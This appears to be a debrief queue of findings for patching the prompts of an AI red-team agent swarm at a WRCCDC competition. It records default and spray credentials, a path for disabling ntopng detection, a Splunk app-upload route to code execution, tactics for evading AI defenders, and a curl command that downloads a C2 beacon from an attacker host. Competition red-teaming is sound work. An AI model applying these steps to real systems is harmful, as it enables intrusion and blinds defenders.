# Debrief Queue — Training Run Findings

Maintained by: TRAIN-002 (Training Evaluator), dispositioned by operator, consumed by TRAIN-003 (Prompt Patcher)
Purpose: Structured list of issues identified during a training run, each with a disposition category that determines the corrective action. After operator review and disposition confirmation, items marked PROMPT-FIX, TEMPLATE-FIX, or WORKFLOW-FIX are sent to TRAIN-003 for patch generation.

---

## Active Debrief

Source run: PCAP Analysis — 2026-inv5 (manual findings, no /training-run)
Date: 2026-03-16
Operator: —
Status: CLOSED — patch-20260316-2.md generated

---

## Disposition Legend

PROMPT-FIX: a competition agent's system prompt needs a correction (add knowledge, fix command template, adjust decision framework, improve refusal handling).

TEMPLATE-FIX: a coordination file template needs revision (add/rename column, change status values, adjust format, add documentation).

WORKFLOW-FIX: a slash command workflow needs adjustment (change agent invocation order, add verification step, modify output format, adjust handoff).

OPERATOR-TRAINING: the operator needs to learn something — not a swarm issue (tool usage, workflow optimization, expectation alignment).

WONTFIX: acceptable limitation — document the manual fallback. Operator provides rationale.

NEEDS-TRIAGE: unclear categorization — requires operator discussion to disposition.

---

## Findings

<!-- ===== 2026-inv5 DEBRIEF (2026-03-16) ===== -->

### Finding #7

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001's 2026 network layout knowledge covers only the quals schema (.14=DC, .20=WordPress, .22=WinRM). The inv5 invitational used a completely different host-role-per-address map. RECON-001 must be updated to (a) present the inv5 layout as a second known pattern and (b) explicitly warn that host roles change between competition events — the agent must verify layout rather than assuming quals schema.
Evidence: 2026-inv5 traffic confirms: .17=DC (milkfarm), .60=Splunk (Work1), .63=ECommerce, .86=Roundcube (moomail), .98=Windows member, .2=firewall/ntopng. None of these match the quals offsets except .2. Competition domain changed to udderstrength.gym. 26 team subnets (10.100.100–125.0/24) vs quals' 30 teams.
Root cause: Only one year of PCAP data was embedded in RECON-001; a single-year sample created false confidence in a stable layout.
Proposed fix: Append "WRCCDC 2026-inv5 Network Layout Pattern" subsection under RECON-001's Common CCDC Infrastructure Patterns section, after the existing 2026-quals layout. Include full address-to-role map, new priority targets (.60 Splunk, .86 Roundcube, .2 ntopng, .17 DC), domain udderstrength.gym, and a prominent NOTE that layout varies by event — always run a quick targeted scan to confirm before committing to a spray sequence.

---

### Finding #8

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of three new scored services confirmed in inv5: Roundcube webmail, Splunk SIEM, and ntopng network monitor. All three use default credentials. Missing these targets means the first 90 seconds of credential spray hits only the quals service set, leaving high-value access ungained before firewall deployment.
Evidence: inv5 traffic shows: Roundcube on .86 hosts (POST /?_task=login, fields _user/_pass/_timezone), Splunk on .60 hosts (port 8000, default admin/changeme), ntopng on .2 hosts (port 443/3000, default admin/admin). Username format changed to lowercase first-initial+lastname (e.g., pyoung). Service accounts moomoo/ceo are scoring-only (not for admin login).
Root cause: No inv5 credential intelligence embedded; EXPLOIT-001 only knows quals service targets.
Proposed fix: Add "2026-inv5 New Credential Targets" section to EXPLOIT-001 covering all three new services with specific login endpoints, POST field formats, default credentials, and the revised username format. Include the Splunk app upload attack path (high value, low noise).

---

### Finding #9

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 has no knowledge of ntopng as a blue team monitoring tool deployed in competition networks. inv5 confirmed ntopng runs on .2 hosts and gives blue teams live flow tables, nDPI protocol detection, and anomaly scoring. Without knowing ntopng is present and can be disabled via its own default credentials, EVADE-001 cannot recommend the highest-value evasion action available in the first 90 seconds.
Evidence: inv5 traffic shows red team accessed ntopng on .2 hosts using admin/admin, navigated to /lua/rest/v2/disable/check.lua, and disabled ndpi_http_suspicious_header via POST. Red team also used ntopng's own API (/lua/rest/v2/get/flow/active_list.lua) to monitor their own traffic's alert score. ntopng modifications are logged — only use if blue team appears unaware.
Root cause: ntopng not in EVADE-001's detection surface model; prior data was quals-only which did not include ntopng.
Proposed fix: Add "ntopng Network Monitor — Evasion Technique" section to EVADE-001 with: detection capabilities, default credential access (admin/admin), IDS disable API path and POST payload, self-monitoring technique, and caveat about audit log visibility.

---

### Finding #10

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's current timing model (patched from 2026-quals) sets the initial access window at 2–3 minutes for AI blue team. inv5 data invalidates this: experienced human teams at inv5 deployed firewall rules in 88 SECONDS. This is 12x faster than quals and means the AI-blue-team estimate must be further revised downward to 15–60 seconds. An OPS-001 operating on the 2–3 minute window will recommend sequential sprays when simultaneous parallel launch at T=0 is required.
Evidence: inv5 Pass 3 analysis: fastest team deployed HTTP firewall at T+88s. 83% of teams firewalled within 22 minutes. Active SSH/RDP sessions survived firewall deployment — only new connections were blocked. Current OPS-001 prompt (patched 2026-03-16) still references 2–3 min window.
Root cause: 2026-quals quals was the only timing data when OPS-001 was last patched; inv5 represents more experienced blue teams closer to Regionals skill level.
Proposed fix: Append a "REVISED Phase Timing — AI Blue Team (updated from 2026-inv5)" subsection to OPS-001's existing 2026 timing section. Key changes: initial window 60–90s maximum; launch ALL credential sprays simultaneously at T=0 (do not wait for scan results); active sessions survive firewall — prioritize session establishment and keepalives above all else.

---

### Finding #11

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: MEDIUM
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of VXLAN overlay infrastructure which WRCCDC uses to deliver team networks. If the jumpbox has access to the underlay (10.1.3.x), passive VXLAN monitoring reveals all team subnets and their hosts without generating any traffic toward team hosts — a zero-noise reconnaissance method that bypasses all detection. RECON-001 should check for VXLAN access at session start.
Evidence: inv5 traffic confirms VXLAN (UDP 4789) through 10.1.3.1–6 VTEPs. VNI encoding: VNI 100–125 = team subnets 100–125. Red team VTEP at 10.1.3.20 (VNI 220). This pattern may recur at Regionals.
Root cause: VXLAN not previously observed in PCAP data; first confirmed in inv5.
Proposed fix: Add "VXLAN Overlay Network Pattern" section to RECON-001's scan strategy. Include underlay IP range, VNI-to-team mapping, passive tap technique, and instruction to verify VXLAN access before beginning traditional scanning.

---

### Finding #12

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no Splunk-specific attack path documented. inv5 confirmed that Splunk with default credentials gives code execution via malicious app upload — a high-value, low-noise vector that persists across Splunk restarts and runs as the Splunk service account (often root). This should be a Tier A quick-win in EXPLOIT-001's playbook whenever Splunk is detected.
Evidence: inv5 traffic shows Splunk app upload POST to /en-US/manager/appinstall/upload_app followed by verification GET to /en-US/splunkd/__raw/services/apps/local/[appname]. Single multipart POST, low noise, looks like normal admin activity. Detection risk LOW.
Root cause: Splunk not previously encountered in PCAP data; first confirmed attack path in inv5.
Proposed fix: Add "Splunk SIEM as Initial Access / Persistence Vector" section to EXPLOIT-001's Quick-Win Service Exploits. Include Attack Path A (malicious app upload with exact URL and verification step) and Attack Path B (search head command injection). Rate as Tier A when Splunk is found with default creds.

<!-- ===== END 2026-inv5 DEBRIEF ===== -->

### Finding #1

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of the WRCCDC 2026 team subnet layout. Without this, it recommends full blind discovery scans rather than targeted scans against known host positions, wasting the critical early window.
Evidence: 2026-quals traffic confirms all 30 teams use 10.100.1XX.0/24 with identical host-role-per-address scheme (.14=DC, .20=WordPress, .22=WinRM, .2=primary Linux, etc.). RECON-001's current prompt contains no year-specific topology data.
Root cause: PCAP intelligence not yet embedded in agent prompts — this is the first PCAP analysis run.
Proposed fix: Add "WRCCDC 2026 Network Layout Pattern" subsection to RECON-001's system prompt under Common CCDC Infrastructure Patterns. Include full address-to-role map, priority host list (.2, .14, .20, .22), shared segment (10.100.100.0/24), and scoring engine IP (10.2.1.5).

---

### Finding #2

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 recommends masscan-style full-rate scanning with no AI blue team calibration. 2026-quals data shows masscan at ~180 pps triggers SSH firewall within 17 minutes by human teams — an AI blue team will respond in 2–3 minutes, invalidating any scan that takes longer.
Evidence: tshark analysis of 2026-quals PCAPs shows SYN flood signature (paired SYNs within 40μs, window 1024, TTL 36, MSS-only options) and SSH host count drop from 43 → 5 at T+17min. AI blue team equivalent response estimated at 2–3 minutes based on log-correlation capability.
Root cause: RECON-001 has no AI blue team response timing model; defaults to standard CCDC scan cadence.
Proposed fix: Add "Scan Rate Calibration for AI Blue Team" section to RECON-001. Include: no full-rate masscan, use nmap -T2/-T1 against known ports only, leverage known layout to skip discovery, limit to ports 22/80/389/443/445/3389/5985, distribute across multiple source IPs, target completion within 5 minutes.

---

### Finding #3

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no 2026-specific credential intelligence. The 2026 quals established a confirmed working credential, AD domain, username format, password pattern, and spray priority order that are all directly reusable at 2026 Regionals.
Evidence: WordPress admin:WaterIsWet?? verified by scoring engine traffic. Domain rmwpra.hydration confirmed in NTLM spray traffic. AD usernames FIRSTNAME_LASTNAME (all-caps, underscore) observed across 5 spray sources. Password pattern: [ThemeWord][Adjective][SpecialChars]. SSH spray window: T+0 to T+15min before firewall deployment.
Root cause: No prior PCAP analysis had been run; credential intelligence not embedded.
Proposed fix: Add "2026 Competition Credential Intelligence" section to EXPLOIT-001. Include domain, confirmed credential, password pattern, AD username format with examples, service accounts (Administrator, backup), and prioritized spray order (SSH first → LDAP/SMB → WordPress → WinRM). Add note about scoring engine: do not change admin:WaterIsWet?? password on compromised WordPress hosts.

---

### Finding #4

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 lacks specific 2026 red team traffic signatures that the AI blue team will have been trained on. Without these, EVADE-001 cannot warn the operator away from burned patterns or recommend specific mitigations.
Evidence: Four distinct burned signatures identified in 2026-quals PCAPs: (1) masscan TCP fingerprint (window 1024, TTL 36, paired SYNs), (2) curl C2 beacon (GET /JSyausLR/LinIUpdater, periodic ~30–60s), (3) NTLM spray clustering (10+ sources, same timestamps, port 389), (4) WinRM POST /wsman from non-admin IP.
Root cause: No prior PCAP analysis; burned signatures not documented in agent prompts.
Proposed fix: Add "2026 Red Team Signatures to Avoid (BURNED PATTERNS)" section to EVADE-001. Include all four signatures with specific TCP/HTTP field values, detection likelihood against AI blue team, and per-signature mitigations. Add AI-specific general mitigations: vary scan source IPs per team, HTTPS C2 only, browser UA strings, legitimate-looking paths.

---

### Finding #5

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's phase timing model is calibrated for human blue teams (~17 minute SSH response window). Against an AI blue team, this model produces catastrophically wrong time budgets — the actual initial access window is 2–3 minutes, not 17. An OPS-001 operating with the wrong timing model will recommend spending time on discovery when the window has already closed.
Evidence: 2026-quals: SSH firewall deployed at T+17min by human teams. AI blue team log-correlation capability implies 2–3 minute equivalent. Current OPS-001 prompt references CCDC defaults with no AI blue team timing adjustment.
Root cause: No AI blue team timing model exists in OPS-001; defaults to human-defender assumptions.
Proposed fix: Add "2026 Competition Phase Timing" section to OPS-001. Include the full observed 2026 quals timeline, adjusted AI blue team timeline (T+0–3min undetected window, T+5min window closes), and recommended three-phase structure: Phase 1 (T+0–5, ultra-fast targeted credential spray), Phase 2 (T+5–30, exploit + encrypted persistence), Phase 3 (T+30+, encrypted channels only).

---

### Finding #6

Disposition: PROMPT-FIX
Agent: PERSIST-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: PERSIST-001 may recommend or fail to warn against HTTP-based implant delivery (curl download + cron execution), which is the exact technique used in 2026 quals. This technique is trivially detected by an AI blue team within 2 minutes and would result in rapid persistence removal.
Evidence: 2026-quals: curl http://10.230.87.61/JSyausLR/LinIUpdater ELF beacon at ~30–60s intervals ran undetected for 115 minutes against HUMAN teams. AI blue team HTTP log correlation would flag this immediately. No current warning in PERSIST-001 about this pattern.
Root cause: 2026 quals technique is not documented as burned in PERSIST-001; agent has no AI-blue-team-specific persistence guidance.
Proposed fix: Add "2026 Quals Persistence Technique — DO NOT REUSE" section to PERSIST-001. Document the exact technique, explain the four reasons it fails against AI blue team (HTTP logging, periodic beacon signature, no encryption, ELF-over-HTTP flagging), and provide preferred alternatives: SSH authorized_keys injection, cron with existing binaries, systemd oneshot service, SSH tunneling for C2, HTTPS C2 with jittered timing and browser UA.

<!-- TRAIN-002 appends findings here using this format:

### Finding #N

Disposition: [PROMPT-FIX | TEMPLATE-FIX | WORKFLOW-FIX | OPERATOR-TRAINING | NEEDS-TRIAGE]
Agent: {agent ID}
Severity: [BLOCKING | HIGH | MEDIUM | LOW]
Category: [REFUSAL | COMMAND-ACCURACY | COORDINATION | TIMING | RECOMMENDATION-QUALITY]

Description: {what happened}
Evidence: {the specific command, refusal text, or inconsistency}
Root cause: {assessment of why this happened}
Proposed fix: {recommendation for how to address it}

-->

---

## Debrief History

Previous debriefs are archived below with their disposition summaries. Full patch files are in training/patches/.

No previous debriefs.
